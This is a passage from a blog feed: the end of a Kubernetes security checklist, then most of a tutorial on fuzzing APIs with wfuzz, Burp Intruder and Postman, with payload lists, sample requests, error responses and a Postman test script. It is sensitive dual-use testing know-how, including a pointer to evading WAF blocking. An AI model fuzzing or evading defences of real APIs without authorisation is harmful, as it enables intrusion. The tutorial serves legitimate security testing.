&lt;h4 id=&#34;know-how-to-configure-gui-elements-for-secure-access&#34;&gt;Know How to Configure GUI Elements for Secure Access**&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;GUI Protection&lt;/strong&gt;: GUI elements, like the Kubernetes Dashboard, must be protected from unauthorized access to prevent potential harm.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;RBAC Configuration&lt;/strong&gt;: Properly set up RBAC (Role-Based Access Control) for specific stakeholders.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Security-Related Command Line Arguments&lt;/strong&gt;: Have a rough understanding of security-related command line arguments. Practice installing the Dashboard, tweaking command line arguments, and setting permissions for different users.&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;know-how-to-detect-modified-platform-binaries&#34;&gt;Know How to Detect Modified Platform Binaries&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Binary Verification&lt;/strong&gt;: Platform binaries like &lt;code&gt;kubectl&lt;/code&gt; and &lt;code&gt;kubeadm&lt;/code&gt; can be verified against their corresponding hash codes.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Hash Files and Validation&lt;/strong&gt;: Know where to find the hash files and how to use validation tools to check if the binaries have been tampered with.&lt;/li&gt;
&lt;/ul&gt;
</content>
    </item>
    
    <item>
      <title>Fuzzing APIs</title>
      <link>https://flowhero.github.io/newblog/posts/fuzzing-apis/</link>
      <pubDate>Tue, 22 Aug 2023 00:40:26 +0100</pubDate>
      
      <guid>https://flowhero.github.io/newblog/posts/fuzzing-apis/</guid>
      <description>title = &amp;lsquo;CKS&amp;rsquo; date = 2024-08-23T23:17:59+01:00 draft = false +++
1 - Toolkits wfuzz Burp Intruder Postman’s Collection Runner 2 - Goal We’ll cover two strategies to increase your success:
Fuzzing wide and fuzzing deep. How to fuzz for improper assets management vulnerabilities, find the accepted HTTP methods for a request, and bypass input sanitization. 3 - What is API Fuzzing ? API fuzzing is the process of sending requests with various types of input to an endpoint in order to provoke an unintended result.</description>
      <content>&lt;p&gt;title = &amp;lsquo;CKS&amp;rsquo;
date = 2024-08-23T23:17:59+01:00
draft = false
+++&lt;/p&gt;
&lt;h2 id=&#34;1---toolkits&#34;&gt;1 - Toolkits&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;wfuzz&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Burp Intruder&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Postman’s Collection Runner&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2---goal&#34;&gt;2 - Goal&lt;/h2&gt;
&lt;p&gt;We’ll cover two strategies to increase your success:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Fuzzing wide and fuzzing deep.&lt;/li&gt;
&lt;li&gt;How to fuzz for improper assets management vulnerabilities, find the accepted HTTP methods for a request, and bypass input sanitization.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;3---what-is-api-fuzzing-&#34;&gt;3 - What is API Fuzzing ?&lt;/h2&gt;
&lt;p&gt;API fuzzing is the process of sending requests with various types of input to an endpoint in order to provoke an unintended result.&lt;/p&gt;
&lt;p&gt;Here&amp;rsquo;s an example of modifying a key in a JSON data on a POST request , which let the server to reveal a SQL Syntax Error.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/sqlattemptt.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;p&gt;Your input could include&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Symbols,&lt;/li&gt;
&lt;li&gt;Numbers,&lt;/li&gt;
&lt;li&gt;Emojis,&lt;/li&gt;
&lt;li&gt;Decimals,&lt;/li&gt;
&lt;li&gt;Hexadecimal,&lt;/li&gt;
&lt;li&gt;System commands,&lt;/li&gt;
&lt;li&gt;SQL input &amp;hellip;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;For instance. If the API has not implemented validation checks to handle harmful input, you could end up with a verbose error, a unique response, or (in the worst case) some sort of internal server error indicating that your fuzz caused a denial of service, killing the app.&lt;/p&gt;
&lt;p&gt;Modifying a key in a JSON data on Post request resulted in the server revealing an SQL Syntax Error.&lt;/p&gt;
&lt;h2 id=&#34;4---effective-fuzzing&#34;&gt;4 - Effective Fuzzing&lt;/h2&gt;
&lt;p&gt;Lets take a look at this POST request:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;POST /account/balance/transfer
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Host: bank.com
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;x-access-token: hapi_token
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#34;userid&amp;#34;: 12345,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#34;account&amp;#34;: 224466,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#34;transfer-amount&amp;#34;: 1337.25,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To fuzz this request, you could easily set up Burp Suite or Wfuzz to submit huge payloads as the userid, account, and transfer-amount values. However, this could set off defensive mechanisms, resulting in stronger rate limiting or your token being blocked. If the API lacks these security controls, by all means release the krakens. Otherwise, your best bet is to send a few targeted requests to only one of the values at a time&lt;/p&gt;
&lt;p&gt;Consider the fact that the transfer-amount value likely expects a relatively small number. Bank.com isn’t anticipating an individual user to transfer an amount larger than the global GDP. It also likely expects a decimal value. Thus, you might want to evaluate what happens when:&lt;/p&gt;
&lt;p&gt;• Sending an exceptionally large number when a small number is expected&lt;/p&gt;
&lt;p&gt;• Sending &lt;code&gt;database queries&lt;/code&gt;, &lt;code&gt;system commands&lt;/code&gt;, and other code&lt;/p&gt;
&lt;p&gt;• Sending a &lt;code&gt;String of letters&lt;/code&gt;  when a number is expected&lt;/p&gt;
&lt;p&gt;• Sending a &lt;code&gt;large String of letters&lt;/code&gt;  when a small string is expected&lt;/p&gt;
&lt;p&gt;• Sending various symbols  &lt;code&gt;!@#$%^&amp;amp;*();&#39;:&#39;&#39;|,./?&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;• Sending characters from unexpected languages &lt;code&gt;(漢, さ, Ж, Ѫ, Ѭ, Ѧ, Ѩ, Ѯ)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;• Sending Emojis &lt;code&gt;😀😃😄😁😆&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;These requests could easily lead to verbose errors that reveal more about the application. A value in the quadrillions could additionally cause an unhandled SQL database error to be sent back as a response.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Thus, the success of your fuzzing will depend on where you are fuzzing and what you are fuzzing with, If these inputs do not have sufficient input handling and error handling, they can often lead to exploitation.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;If you are blocked or banned while fuzzing, you might want to deploy evasion techniques discussed in my blog &lt;a href=&#34;https://flowhero.github.io/blogsite/docs/bypassing-wafs/&#34;&gt;https://flowhero.github.io/blogsite/docs/bypassing-wafs/&lt;/a&gt; or else further limit the number of fuzzing requests you send.&lt;/p&gt;
&lt;h2 id=&#34;5---choosing-fuzzing-payloads&#34;&gt;5 - Choosing Fuzzing Payloads&lt;/h2&gt;
&lt;p&gt;Different fuzzing payloads can incite various types of responses. You can use either generic fuzzing payloads or more targeted ones&lt;/p&gt;
&lt;h3 id=&#34;51---generic-payloads&#34;&gt;5.1 - Generic Payloads&lt;/h3&gt;
&lt;p&gt;Are those we’ve discussed so far and contain symbols, null bytes, directory traversal strings, encoded characters, large numbers, long strings, and so on.&lt;/p&gt;
&lt;h3 id=&#34;52---targeted-fuzzing-payloads&#34;&gt;5.2 - Targeted Fuzzing Payloads&lt;/h3&gt;
&lt;p&gt;Are aimed at provoking a response from specific technologies and types of vulnerabilities.&lt;/p&gt;
&lt;p&gt;Targeted fuzzing payload types might include &lt;strong&gt;API object&lt;/strong&gt; or &lt;strong&gt;variable names&lt;/strong&gt;, &lt;strong&gt;cross-site scripting (XSS)&lt;/strong&gt; payloads, &lt;strong&gt;directories&lt;/strong&gt;, &lt;strong&gt;file extensions&lt;/strong&gt;, &lt;strong&gt;HTTP request methods&lt;/strong&gt;, &lt;strong&gt;JSON&lt;/strong&gt; or &lt;strong&gt;XML data&lt;/strong&gt;, &lt;strong&gt;SQL&lt;/strong&gt; commands, or OS &lt;strong&gt;commands&lt;/strong&gt; .&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Targeted fuzzing payloads are more useful once you know the technologies being used. If you’re sending SQL fuzzing payloads to an API that leverages only NoSQL databases, your testing won’t be as effective.&lt;/p&gt;
&lt;p&gt;You can use the following sources for fuzzing paylaods:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SecLists&lt;/code&gt; Payloads &lt;a href=&#34;https://github.com/danielmiessler/SecLists&#34;&gt;https://github.com/danielmiessler/SecLists&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;SecLists has a whole section dedicated to fuzzing, and its big-list-of-naughty-strings.txt wordlist is excellent at causing useful responses.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Wfuzz&lt;/code&gt; Payloads &lt;a href=&#34;https://github.com/xmendez/wfuzz&#34;&gt;https://github.com/xmendez/wfuzz&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Wfuzz has a great list that combines several targeted payloads in their injection directory, called &lt;a href=&#34;https://raw.githubusercontent.com/xmendez/wfuzz/1b695ee9a87d66a7d7bf6cae70d60a33fae51541/wordlist/Injections/All_attack.txt&#34;&gt;All_attack.txt&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;fuzzdb&lt;/code&gt; Payloads &lt;a href=&#34;https://github.com/fuzzdb-project/fuzzdb&#34;&gt;https://github.com/fuzzdb-project/fuzzdb&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;6---anomaly-detection&#34;&gt;6 - Anomaly Detection&lt;/h2&gt;
&lt;p&gt;When an API request payload is handled properly, you should receive some sort of HTTP response code and message indicating that your fuzzing did not work. For example, sending a request with a string of letters when numbers are expected could result in a simple response like the following:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;400&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Bad Request&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;#34;error&amp;#34;: &amp;#34;number required&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From this response, you can deduce that the developers configured the API to properly handle requests like yours and prepared a tailored response.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;When input is not handled properly and causes an error, the server will often return that error in the response. For example, if you sent input like &lt;code&gt;~&#39;!@#$%^&amp;amp;*()-_+&lt;/code&gt; to an endpoint that improperly handles it, you could receive an error like this:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;OK&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;--snip--&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SQL Error: There is an error in your SQL syntax.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This response immediately reveals that you’re interacting with an API request that does not handle input properly and that the backend of the application is utilizing a SQL database.&lt;/p&gt;
&lt;h2 id=&#34;7---fuzzing-wide-and-deep&#34;&gt;7 - Fuzzing Wide and Deep&lt;/h2&gt;
&lt;p&gt;This section will introduce you to two fuzzing techniques: &lt;code&gt;fuzzing wide&lt;/code&gt; and &lt;code&gt;fuzzing deep&lt;/code&gt;.&lt;/p&gt;
&lt;h3 id=&#34;71---fuzzing-wide&#34;&gt;7.1 - Fuzzing Wide&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Fuzzing wide&lt;/strong&gt; is the act of sending an input across all of an API’s unique requests in an attempt to discover a vulnerability.&lt;/p&gt;
&lt;p&gt;Is best used to test for issues across all unique requests. Typically, you can fuzz wide to test for improper assets management (more on this later in this blog), finding all valid request methods, token-handling issues, and other information disclosure vulnerabilities.&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;72---fuzzing-deep&#34;&gt;7.2 - Fuzzing Deep&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Fuzzing deep&lt;/strong&gt; is the act of thoroughly testing an individual request with a variety of inputs, replacing headers, parameters, query strings, endpoint paths, and the body of the request with your payloads.&lt;/p&gt;
&lt;p&gt;Is best used for testing many aspects of individual requests. Most other vulnerability discovery will be done by fuzzing deep. In later chapters, we will use the fuzzing deep technique to discover different types of vulnerabilities, including BOLA, BFLA, injection, and mass assignment.&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;73---fuzzing-wide-w-postman&#34;&gt;7.3 - Fuzzing Wide w/ &lt;em&gt;Postman&lt;/em&gt;&lt;/h3&gt;
&lt;p&gt;I recommend using Postman to fuzz wide for vulnerabilities across an API, as the tool’s Collection Runner makes it easy to run tests against all API requests. If an API includes 150 unique requests across all the endpoints, you can set a variable to a fuzzing payload entry and test it across all 150 requests. This is particularly easy to do when you’ve built a collection or imported API requests into Postman. For example, you might use this strategy to test whether any of the requests fail to handle various “bad” characters. Send a single payload across the API and check for anomalies.&lt;/p&gt;
&lt;p&gt;Create a Postman environment in which to save a set of fuzzing variables. This lets you seamlessly use the environmental variables from one collection to the next. Once the fuzzing variables are set as shown below, you can save or update the environment.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_22_222354.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;p&gt;At the top right, select the fuzzing environment and then use the variable shortcut {{variable name}} wherever you would like to test a value in a given collection. We can for example replace x-access-token header with the first fuzzing variable.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_22_225101.png&#34; alt=&#34;image&#34;&gt;
then start the Postman Collection Runner:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_22_230418.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;p&gt;You can also look manually in the collection for some parameters or headers that you want to replace with a fuzzing variable, using &lt;strong&gt;Find and Replace&lt;/strong&gt; feature, found at the bottom left of Postman.&lt;/p&gt;
&lt;p&gt;Find and Replace lets you search a collection (or all collections) and replace certain terms with a Fuzzing 209 replacement of your choice. If you were attacking the Pixi API, for example, you might notice that many placeholder parameters use tags like &lt;em&gt;email&lt;/em&gt;, &lt;em&gt;number&lt;/em&gt;, &lt;em&gt;string&lt;/em&gt;, and &lt;em&gt;boolean&lt;/em&gt;. This makes it easy to search for these values and replace them with either legitimate ones or one of your fuzzing variables, like &lt;code&gt;{{fuzz1}}&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_22_231122.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;p&gt;Next, try creating a simple test in the Tests panel to help you detect anomalies.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;let response &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; JSON&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;parse&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;responseBody&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pm&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;“&lt;/span&gt;Request passes with success&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;”&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; _function_&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;response&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;info&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;”&lt;/span&gt;Success&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;”&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pm&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;expect&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fail&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;“&lt;/span&gt;Test fails with the following special character&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;“&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pm&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;request&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;body&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;formdata&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;“&lt;/span&gt;searchQ&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;”&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)+&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;“&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;“&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;“&lt;/span&gt;Errorcode&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;”&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;“&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;“&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; response&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;error&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then start the Postman Collection Runner.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_22_231634.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;74---fuzzing-deep-w-postman&#34;&gt;7.4 - Fuzzing Deep w/ &lt;em&gt;Postman&lt;/em&gt;&lt;/h3&gt;
&lt;p&gt;In the Wide Fuzzing, we were using 1 fuzzing variable everywhere (in this case we were testing &lt;code&gt;fuzz1 = ~&#39;!@#$%^&amp;amp;*()-_+&lt;/code&gt; everywhere we find &lt;code&gt;limit&lt;/code&gt; parameter)&lt;/p&gt;
&lt;h4 id=&#34;scenario-1--fuzzing-endpoints-in-urls&#34;&gt;Scenario 1 : Fuzzing endpoints in URLs&lt;/h4&gt;
&lt;p&gt;This time, we&amp;rsquo;ll be Fuzzing with the &lt;a href=&#34;https://gist.githubusercontent.com/DannyDainton/b820904694a91e20de1ad900cdeb3a94/raw/9f6dcabfe34506e81ca75ffb092550f709dad043/naughtyStrings.json&#34;&gt;Big List of Naughty Strings&lt;/a&gt; wordlist, we replace the parameters that we want to fuzz with &lt;code&gt;{{naughtyValue}}&lt;/code&gt; that will remain undefined:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_23_013105.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;p&gt;until we pass through the data from an external file as shown in the second figure below:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_22_230256.png&#34; alt=&#34;image&#34;&gt;&lt;/td&gt;
&lt;td&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_22_232306.png&#34; alt=&#34;image&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Then we select only the endpoints we want test since we are performing deep fuzzing:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_23_014009.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;p&gt;we have &lt;strong&gt;504&lt;/strong&gt; iterations because we have &lt;strong&gt;504&lt;/strong&gt; naughtyValue. After running the test we can see the results live,&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_23_014928.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;p&gt;Then we can check if there is any abnormal response by looking at Code Status and Size of the Response, we could set up more than just one variable to test, we could actually choose an endpoint with multiple parameters and assign them all as &lt;code&gt;{{naughtyValue}}&lt;/code&gt;  variables, then start fuzzing, but this is something that we can do using &lt;code&gt;Burp Intuder&lt;/code&gt; &amp;amp; &lt;code&gt;Wfuzz&lt;/code&gt; (and that&amp;rsquo;s what we&amp;rsquo;ll do in the next section), Postman collection runner will help us fuzz for an entire collection (or just parts of it) , which is something that is not available in &lt;code&gt;Burp&lt;/code&gt; &amp;amp; &lt;code&gt;Wfuzz&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;scenario-2-fuzzing-parameters-in-post-requests&#34;&gt;Scenario 2: Fuzzing Parameters in POST Requests&lt;/h4&gt;
&lt;p&gt;We could also fuzz for parameters inside POST Requests, go to the request that you want to test, modify the parameters inside:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_23_210000.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;p&gt;Start the Collection Runner and choose the endpoints where you modified the parameters to &lt;code&gt;{{naughtyValue}}&lt;/code&gt; and run the Collection Runner:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_23_210114.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;p&gt;You can now see that the parameters that we specified are now different in each iteration:&lt;/p&gt;
&lt;p&gt;Iteration 142:
&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_23_211713.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;p&gt;Iteration 134:
&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_23_211725.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;p&gt;Keep in mind that this is a &lt;code&gt;Battering Ram Attack Mode&lt;/code&gt;, you can take a look at the &lt;a href=&#34;https://portswigger.net/burp/documentation/desktop/tools/intruder/configure-attack/attack-types&#34;&gt;4 Attacks Types Here&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;For &lt;code&gt;Pitchforck&lt;/code&gt; :&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;This is How we set the payload file&lt;/td&gt;
&lt;td&gt;Preview in Postman Collection Runner&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
